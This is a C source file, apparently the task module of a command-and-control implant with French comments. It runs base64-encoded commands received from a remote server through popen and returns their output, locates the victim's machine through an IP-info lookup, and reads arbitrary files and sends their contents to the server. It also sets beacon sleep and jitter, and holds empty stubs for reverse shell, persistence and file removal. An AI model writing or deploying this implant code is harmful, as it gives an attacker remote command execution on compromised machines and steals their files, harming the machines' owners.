#define _POSIX_C_SOURCE 200809L

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "base64.h"
#include "client.h"
#include "tasks.h"
#include "network.h"

// Server information
extern const char* server_ip;
extern const int server_port;

void task_execve(char *command_str, char *argument_str, const char *id_task) {
    
    // Decoding command and argument
    char *command = decode(command_str);
    char *argument = NULL;
    
    if (argument_str != NULL) {
        argument = decode(argument_str);
    }
    
    // String concatenation with bounds checking
    char full_command[4096] = {0};
    if (command != NULL) {
        if (argument != NULL) {
            snprintf(full_command, sizeof(full_command), "%s %s", command, argument);
        } else {
            snprintf(full_command, sizeof(full_command), "%s", command);
        }
    } else {
        if (argument) free(argument);
        return;
    }
    
    
    // Execute the command and capture output
    char result_buffer[4096] = {0};
    FILE *fp = popen(full_command, "r");
    if (fp == NULL) {
        free(command);
        if (argument) free(argument);
        return;
    }
    
    // Read output
    char buffer[1024];
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        strncat(result_buffer, buffer, sizeof(result_buffer) - strlen(result_buffer) - 1);
    }
    pclose(fp);
    
    // Send the result back to the server
    if (strlen(result_buffer) > 0) {
        // Encoding the result
        char *encoded_result = encode(result_buffer);
        
        // Building the message
        char message[4096];
        snprintf(message, sizeof(message), "RESULT,%s,%s,%s", uid, id_task, encoded_result);
        
        // Send the result to the server
        char *response = send_server_message(message, server_ip, server_port);
        
        if (response != NULL) {
            free(response);
        } 
        free(encoded_result);
    } 
    free(command);
    if (argument) free(argument);
}

void task_sleep(char *sleep_time_str, char *jitter_str) {
    
    if (sleep_time_str != NULL) {
        char *decoded_sleep = decode(sleep_time_str);
        if (decoded_sleep != NULL) {
            sleep_time = atof(decoded_sleep);
            free(decoded_sleep);
        }
    }

    if (jitter_str != NULL) {
        char *decoded_jitter = decode(jitter_str);
        if (decoded_jitter != NULL) {
            jitter = atof(decoded_jitter);
            printf("Jitter : %.2f%%\n", jitter);
            free(decoded_jitter);
        }
    }
    
    return;
}

void task_locate(const char *id_task) {

    char result_buffer[4096] = {0};

    // Get localization info with curl CHANGE LE MODE
    FILE *fp = popen("curl -s ipinfo.io", "r");
    if (fp == NULL) {
        perror("Erreur lors de l'exécution de curl");
        return;
    }

    char buffer[1024];
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        strncat(result_buffer, buffer, sizeof(result_buffer) - strlen(result_buffer) - 1);
    }
    pclose(fp);

    // Encode the result
    char *encoded_result = encode(result_buffer);
    if (encoded_result == NULL) {
        printf("Erreur d'encodage en base64\n");
        printf("Tâche annulée\n");
        return;
    }

    // Building the message
    char message[4096];
    snprintf(message, sizeof(message), "RESULT,%s,%s,%s", uid, id_task, encoded_result);
    
    // Send the result to the server
    char *response = send_server_message(message, server_ip, server_port);
    
    if (response != NULL) {
        free(response);
    } else {
        printf("Échec de l'envoi du résultat au serveur\n");
    }

    // Free memory
    free(encoded_result);
}

void task_revshell() {
    printf("Exécution de la tâche revshell\n");
    // Implémentation à faire
    return;
}

void task_persist() {
    printf("Exécution de la tâche persist\n");
    // Implémentation à faire
    return;
}

void task_cat(char *file_path_str, const char *id_task) {
    printf("Exécution de la tâche cat\n");
    
    if (file_path_str == NULL) {
        printf("Erreur: Chemin du fichier non spécifié\n");
        return;
    }
    
    printf("Paramètre reçu: %s\n", file_path_str);
    
    // Forcer le décodage base64 du chemin (le serveur l'envoie toujours encodé)
    char *file_path = decode(file_path_str);
    
    if (file_path == NULL) {
        printf("Erreur: Impossible de décoder le chemin du fichier\n");
        printf("Tentative d'utilisation du chemin tel quel comme fallback\n");
        
        // Fallback: utiliser le chemin tel quel si le décodage échoue
        file_path = strdup(file_path_str);
        if (file_path == NULL) {
            printf("Erreur: Impossible d'allouer de la mémoire pour le chemin du fichier\n");
            return;
        }
    }
    
    printf("Chemin du fichier (décodé): %s\n", file_path);
    
    // Ouvrir le fichier en mode lecture binaire pour gérer tous les types de fichiers
    FILE *fp = fopen(file_path, "rb");
    if (fp == NULL) {
        printf("Erreur: Impossible d'ouvrir le fichier %s\n", file_path);
        
        // Envoyer le message d'erreur comme résultat
        char error_buf[512];
        snprintf(error_buf, sizeof(error_buf), "Erreur: Impossible d'ouvrir le fichier %s", file_path);
        char *encoded_error = encode(error_buf);
        if (encoded_error != NULL) {
            char message[4096];
            snprintf(message, sizeof(message), "RESULT,%s,%s,%s", uid, id_task, encoded_error);
            char *response = send_server_message(message, server_ip, server_port);
            if (response != NULL) free(response);
            free(encoded_error);
        }
        free(file_path);
        return;
    }
    
    // Déterminer la taille du fichier
    fseek(fp, 0L, SEEK_END);
    long file_size = ftell(fp);
    rewind(fp);
    
    printf("Taille du fichier: %ld octets\n", file_size);
    
    // Vérifier si le fichier est trop grand
    if (file_size > 3072) { // Limiter à 3KB pour assurer la compatibilité base64
        printf("Attention: Fichier trop grand, tronqué à 3KB\n");
        file_size = 3072;
    }
    
    // Allouer un tampon pour le contenu du fichier
    char *file_content = malloc(file_size + 1);
    if (file_content == NULL) {
        printf("Erreur: Impossible d'allouer de la mémoire pour le contenu du fichier\n");
        fclose(fp);
        free(file_path);
        return;
    }
    
    // Lire le contenu du fichier
    size_t bytes_read = fread(file_content, 1, file_size, fp);
    file_content[bytes_read] = '\0';
    fclose(fp);
    
    printf("Contenu lu: %zu octets\n", bytes_read);
    
    // Encoder le contenu du fichier
    printf("Encodage du contenu en base64...\n");
    char *encoded_result = encode(file_content);
    if (encoded_result == NULL) {
        printf("Erreur d'encodage en base64\n");
        free(file_content);
        free(file_path);
        return;
    }
    
    printf("Encodage réussi, taille: %zu octets\n", strlen(encoded_result));
    
    // Envoyer le résultat au serveur
    char message[4096];
    snprintf(message, sizeof(message), "RESULT,%s,%s,%s", uid, id_task, encoded_result);
    
    char *response = send_server_message(message, server_ip, server_port);
    if (response != NULL) {
        printf("Réponse du serveur: %s\n", response);
        free(response);
    } else {
        printf("Aucune réponse du serveur\n");
    }
    
    free(encoded_result);
    free(file_content);
    free(file_path);
}

void task_mv() {
    printf("Exécution de la tâche mv\n");
    // Implémentation à faire
    return;
}

void task_rm() {
    printf("Exécution de la tâche rm\n");
    // Implémentation à faire
    return;
}

void task_ps() {
    printf("Exécution de la tâche ps\n");
    // Implémentation à faire
    return;
}

